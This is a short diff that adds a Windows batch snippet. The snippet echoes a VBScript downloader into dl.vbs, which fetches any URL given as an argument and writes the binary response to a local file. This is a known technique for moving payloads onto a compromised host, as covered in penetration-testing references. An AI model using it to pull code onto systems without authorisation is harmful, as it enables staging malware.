@@ -1,0 +1,15 @@
+echo Set args = WScript.Arguments >> dl.vbs
+ 
+echo Url = args.Item(0) >> dl.vbs
+ 
+echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") >> dl.vbs
+echo dim bStrm: Set bStrm = createobject("Adodb.Stream") >> dl.vbs
+echo xHttp.Open "GET", Url, False >> dl.vbs
+echo xHttp.Send >> dl.vbs
+ 
+echo with bStrm >> dl.vbs
+echo     .type = 1 '//binary >> dl.vbs
+echo     .open >> dl.vbs
+echo     .write xHttp.responseBody >> dl.vbs
+echo     .savetofile "dl", 2 '//overwrite >> dl.vbs
+echo end with >> dl.vbs
